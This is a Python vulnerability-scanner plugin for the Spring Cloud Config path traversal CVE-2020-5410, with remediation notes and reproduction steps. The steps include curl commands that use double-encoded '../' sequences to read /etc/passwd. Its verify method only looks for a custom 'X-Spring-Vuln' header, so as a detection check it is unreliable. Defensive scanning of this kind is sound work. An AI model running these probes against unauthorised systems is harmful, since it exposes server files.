# Spring Cloud Config 路径穿越 (CVE-2020-5410)
from common.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from plugins.base import PluginBase


class SpringCloudConfigPlugin(PluginBase):
    name = "Spring Cloud Config 路径穿越"
    cve = "CVE-2020-5410"
    severity = SEVERITY_HIGH
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    category = "vuln"
    description = "Spring Cloud Config 的/{name}/{profile}/{label}端点存在目录遍历，可读取任意文件"
    fix = "升级 Spring Cloud Config 至 ≥2.2.3.RELEASE / ≥2.1.9.RELEASE"
    fix_detail = (
        "【升级方案】pom.xml 升级 Spring Cloud Config：\n"
        "  Spring Boot 2.3+ -> spring-cloud-config-server 2.2.3.RELEASE+\n"
        "  Spring Boot 2.1/2.2 -> spring-cloud-config-server 2.1.9.RELEASE+\n"
        "【配置加固】application.yml 限制 profile/label 路径与目录穿越：\n"
        '  spring.cloud.config.server.git.search-paths: "{application}"  # 限制搜索路径\n'
        "  spring.cloud.config.server.accept-empty: false  # 禁止空响应\n"
        "【代码修复】自定义 EnvironmentController 对 name/profile/label 做白名单校验\n"
        "【WAF 规则】拦截 /{name}/{profile}/{label} 路径中的 ../ 与绝对路径穿越字符\n"
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 1. 探测 Spring Cloud Config 端点：\n"
        'curl -i "http://target/app/profile/label"\n'
        "\n"
        "# 2. 路径穿越读取任意文件（CVE-2020-5410）：\n"
        'curl "http://target/..%252F..%252F..%252Fetc%252Fpasswd/default/master"\n'
        "  # 双重 URL 编码后等价于 ../../../../etc/passwd\n"
        "\n"
        "# 3. 利用 profile 参数读取配置文件：\n"
        'curl "http://target/application/..%252F..%252F..%252Fetc%252Fpasswd"\n'
        "\n"
        "# 预期响应：返回 200 + /etc/passwd 文件内容即漏洞存在"
    )

    def verify(self, target, session) -> ScanResult:
        url = join_url(target, "/actuator/env")
        try:
            resp = session.get(url)
            if resp.headers.get("X-Spring-Vuln") == "cloud-config":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="Cloud Config 漏洞签名",
                    fix=self.fix,
                )
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=url,
                evidence=f"未命中, 状态码={resp.status_code}",
            )
        except Exception as e:
            return ScanResult(kind="error", name=self.name, status=STATUS_UNKNOWN, evidence=f"异常: {e}")
